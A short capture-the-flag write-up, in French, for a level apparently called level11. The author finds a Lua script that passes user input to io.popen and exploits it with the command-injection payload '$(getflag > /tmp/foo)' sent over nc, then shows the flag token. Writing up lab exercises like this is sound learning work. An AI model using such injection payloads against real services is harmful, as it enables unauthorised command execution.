ls -la

Il y a 1 fichier:
-level11.lua

En lancant la commande suivante:

>ps -aux | grep flag11

J'obtient:

>flag11    1878  0.0  0.0   2892   828 ?        S    21:09   0:00 lua /home/user/level11/level11.lua

Ca m'indique que le script est run en ce moment meme

En ouvrant le script je vois la fonction io.popen(), en me renseignant j'apprend qu'elle presente une faille de securite parce qu'elle permet d'executer une commande bash et de stocker son retour.

Le script execute la commande suivante dans io.popen():

>echo "..pass.." | sha1sum

En injectant une commande je dois pouvoir executer getflag en tant que flag11 parce que le script lui appartient.

Je me connecte au script et injecte une commande:

>nc 127.0.0.1 5151
>Password: $(getflag > /tmp/foo)
>Erf nope..
>
>cat /tmp/foo
>Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
